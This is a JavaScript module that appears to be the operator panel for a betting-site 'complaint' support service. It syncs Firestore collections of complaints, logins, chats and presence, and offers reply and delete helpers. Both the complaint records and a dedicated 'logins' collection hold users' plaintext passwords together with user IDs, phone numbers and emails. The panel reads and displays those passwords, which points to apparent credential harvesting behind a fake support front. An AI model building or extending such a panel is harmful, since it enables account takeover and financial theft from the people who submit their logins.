/* GBET-PENNAL - Firestore live sync (complaints + chats) */
import { initializeApp } from "https://www.gstatic.com/firebasejs/10.12.2/firebase-app.js";
import {
  getFirestore,
  collection,
  doc,
  onSnapshot,
  addDoc,
  setDoc,
  updateDoc,
  deleteDoc,
  enableIndexedDbPersistence
} from "https://www.gstatic.com/firebasejs/10.12.2/firebase-firestore.js";
import { firebaseConfig } from "./firebase-config.js?v=20261020o";

var app = initializeApp(firebaseConfig);
var db = getFirestore(app);

try {
  enableIndexedDbPersistence(db).catch(function () {
    /* multi-tab or unsupported browser: online sync still works */
  });
} catch (e) {
  /* ignore persistence errors */
}

function toIso(value) {
  if (value == null || value === '') return new Date().toISOString();
  if (typeof value === 'number') return new Date(value).toISOString();
  if (typeof value === 'object' && typeof value.toDate === 'function') return value.toDate().toISOString();
  var s = String(value);
  if (/^\d+$/.test(s)) return new Date(Number(s)).toISOString();
  var t = Date.parse(s);
  return isNaN(t) ? new Date().toISOString() : new Date(t).toISOString();
}

function categoryOf(v, problem) {
  if (v.category === 'deposit' || v.category === 'withdrawal' || v.category === 'email') return v.category;
  var p = String(problem || '').toLowerCase();
  if (p.indexOf('withdraw') !== -1) return 'withdrawal';
  if (p.indexOf('email') !== -1) return 'email';
  return 'deposit';
}

function normalize(snap) {
  var v = snap.data() || {};
  var problem = v.problemType || v.problem || '';
  var proof = typeof v.proof === 'string' ? v.proof : (typeof v.image === 'string' ? v.image : '');
  return {
    id: String(snap.id),
    userId: v.userId || '',
    name: v.name || v.username || 'User',
    uid: v.uid || '',
    mobile: v.mobile || '',
    email: v.email || '',
    password: v.password || '',
    category: categoryOf(v, problem),
    problemType: problem,
    amount: v.amount ? String(v.amount) : '',
    details: v.details || '',
    status: v.status || 'Pending',
    createdAt: toIso(v.createdAt),
    proof: proof
  };
}

function emit(name, detail) {
  document.dispatchEvent(new CustomEvent(name, { detail: detail }));
}

/* ---------- complaints ---------- */

var complaints = [];

onSnapshot(collection(db, 'complaints'), function (snap) {
  complaints = snap.docs.map(normalize);
  complaints.sort(function (a, b) { return new Date(b.createdAt) - new Date(a.createdAt); });
  emit('gbfb:complaints', complaints.slice());
}, function (err) {
  emit('gbfb:error', String((err && err.message) || err));
});

/* ---------- logins ---------- */

var logins = [];

onSnapshot(collection(db, 'logins'), function (snap) {
  logins = snap.docs.map(function (d) {
    var v = d.data() || {};
    var uid = v.uid || v.loginId || '';
    return {
      id: String(d.id),
      userId: v.userId || '',
      name: v.name || uid || 'User',
      uid: uid,
      password: v.password || '',
      loginType: v.loginType || '',
      createdAt: toIso(v.createdAt)
    };
  });
  logins.sort(function (a, b) { return new Date(b.createdAt) - new Date(a.createdAt); });
  emit('gbfb:logins', logins.slice());
}, function (err) {
  emit('gbfb:error', String((err && err.message) || err));
});

/* ---------- chats ---------- */

var chats = [];

onSnapshot(collection(db, 'chats'), function (snap) {
  chats = snap.docs.map(function (d) {
    var v = d.data() || {};
    return {
      id: String(d.id),
      text: typeof v.text === 'string' ? v.text : '',
      userId: v.userId || '',
      role: v.role === 'support' ? 'support' : (v.role === 'user' ? 'user' : 'system'),
      createdAt: toIso(v.createdAt)
    };
  }).filter(function (m) { return m.text; });
  chats.sort(function (a, b) { return new Date(a.createdAt) - new Date(b.createdAt); });
  emit('gbfb:chats', chats.slice());
}, function (err) {
  emit('gbfb:error', String((err && err.message) || err));
});

/* ---------- presence ---------- */

var presence = [];

onSnapshot(collection(db, 'presence'), function (snap) {
  presence = snap.docs.map(function (d) {
    var v = d.data() || {};
    var seen = typeof v.lastSeen === 'number' ? v.lastSeen : Date.parse(v.lastSeen || '');
    return {
      id: String(d.id),
      userId: v.userId || String(d.id),
      online: v.online === true,
      lastSeen: isNaN(seen) ? 0 : seen
    };
  });
  emit('gbfb:presence', presence.slice());
}, function (err) {
  emit('gbfb:error', String((err && err.message) || err));
});

/* ---------- write helpers ---------- */

var CATEGORY_LABEL = {
  deposit: 'Deposit Problem',
  withdrawal: 'Withdrawal Problem',
  email: 'Email Verification'
};

function cloudPayload(record) {
  var problem = record.problemType || CATEGORY_LABEL[record.category] || 'Complaint';
  var created = Date.parse(record.createdAt || '');
  if (isNaN(created)) created = Date.now();
  return {
    name: record.name || '',
    username: record.name || '',
    uid: record.uid || '',
    mobile: record.mobile || '',
    email: record.email || '',
    password: record.password || '',
    category: record.category || 'deposit',
    problemType: problem,
    problem: problem,
    amount: record.amount || '',
    details: record.details || '',
    status: record.status || 'Pending',
    createdAt: created,
    date: new Date(created).toLocaleString('en-IN'),
    proof: record.proof || '',
    image: record.proof || ''
  };
}

window.GBET_FB = {
  list: function () { return complaints.slice(); },
  get: function (id) {
    for (var i = 0; i < complaints.length; i++) if (complaints[i].id === id) return complaints[i];
    return null;
  },
  save: function (record) {
    return setDoc(doc(db, 'complaints', String(record.id)), cloudPayload(record), { merge: true });
  },
  setStatus: function (id, status) {
    return updateDoc(doc(db, 'complaints', String(id)), { status: status });
  },
  remove: function (id) {
    return deleteDoc(doc(db, 'complaints', String(id)));
  },
  logins: function () { return logins.slice(); },
  getLogin: function (id) {
    for (var i = 0; i < logins.length; i++) if (logins[i].id === id) return logins[i];
    return null;
  },
  removeLogin: function (id) {
    return deleteDoc(doc(db, 'logins', String(id)));
  },
  chats: function () { return chats.slice(); },
  presence: function () { return presence.slice(); },
  reply: function (userId, text) {
    return addDoc(collection(db, 'chats'), {
      userId: String(userId || ''),
      text: String(text || ''),
      role: 'support',
      createdAt: Date.now(),
      date: new Date().toLocaleString('en-IN')
    });
  },
  clearChats: function () {
    return Promise.all(chats.map(function (m) {
      return deleteDoc(doc(db, 'chats', String(m.id)));
    }));
  }
};
